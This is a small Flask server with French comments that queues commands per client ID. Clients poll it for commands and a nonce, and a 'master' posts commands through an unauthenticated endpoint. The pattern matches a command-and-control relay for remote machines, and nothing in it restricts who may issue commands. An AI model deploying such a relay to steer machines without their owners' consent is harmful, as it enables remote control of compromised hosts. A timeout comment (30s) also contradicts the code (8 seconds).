from flask import Flask, request, jsonify
from datetime import datetime, timedelta

app = Flask(__name__)

# Stockage des commandes par client
commands = {}  # clientid: {"cmd": "commande", "nonce": 123, "last_seen": datetime}

HEARTBEAT_TIMEOUT = timedelta(seconds=8)  # client offline après 30s

@app.route('/getcommand/<clientid>', methods=['GET'])
def get_command(clientid):
    """
    Retourne la commande et le nonce pour le client.
    Met à jour le timestamp du dernier heartbeat.
    """
    now = datetime.utcnow()
    if clientid not in commands:
        commands[clientid] = {"cmd": "", "nonce": -1, "last_seen": now}
    else:
        commands[clientid]["last_seen"] = now

    data = {"cmd": commands[clientid]["cmd"], "nonce": commands[clientid]["nonce"]}
    return jsonify(data), 200

@app.route('/getcommand/<clientid>', methods=['POST'])
def post_command(clientid):
    """
    Permet au master d'envoyer une commande et un nonce pour un client
    Expects JSON: {"cmd": "ping 127.0.0.1", "nonce": 42}
    """
    data = request.get_json()
    if not data:
        return jsonify({"message": "JSON manquant"}), 400

    cmd = data.get("cmd", "")
    nonce = data.get("nonce", 0)

    now = datetime.utcnow()
    commands[clientid] = {"cmd": cmd, "nonce": nonce, "last_seen": now}
    return jsonify({"message": "Commande enregistrée"}), 200

@app.route('/listclients', methods=['GET'])
def list_clients():
    """Retourne la liste des clients actifs"""
    now = datetime.utcnow()
    # Nettoyer les clients offline
    active_clients = [cid for cid, info in commands.items() if now - info["last_seen"] <= HEARTBEAT_TIMEOUT]
    return jsonify(active_clients), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
